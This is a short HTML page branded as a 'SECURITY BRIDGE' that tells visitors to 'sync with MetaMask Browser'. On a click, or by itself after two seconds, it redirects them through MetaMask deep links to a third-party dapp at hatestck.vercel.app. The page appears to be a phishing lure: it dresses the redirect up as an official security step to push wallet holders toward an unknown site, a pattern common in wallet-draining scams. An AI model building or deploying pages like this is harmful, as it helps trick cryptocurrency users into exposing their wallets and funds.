<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Protocol Redirect</title>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <style>
        body { background: #111; color: #f6851b; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; cursor: pointer; }
        .box { border: 2px solid #f6851b; padding: 40px; border-radius: 20px; }
    </style>
</head>
<body onclick="launch()">
    <div class="box">
        <h1>SECURITY BRIDGE</h1>
        <p>Tap anywhere to sync with MetaMask Browser</p>
    </div>

    <script>
        function launch() {
            // استخدام رابط الـ Dapp المباشر (هذا يفتح المتصفح فوراً وليس البحث)
            const directLink = "https://metamask.app.link/dapp/hatestck.vercel.app";
            window.location.href = directLink;
            
            // Backup بعد ثانية واحدة
            setTimeout(() => {
                window.location.href = "metamask://dapp/hatestck.vercel.app";
            }, 1000);
        }
        
        // محاولة تحويل تلقائي (قد يمنعها المتصفح لذا أضفنا الضغط على الشاشة)
        window.onload = function() {
            setTimeout(launch, 2000);
        }
    </script>
</body>
</html>
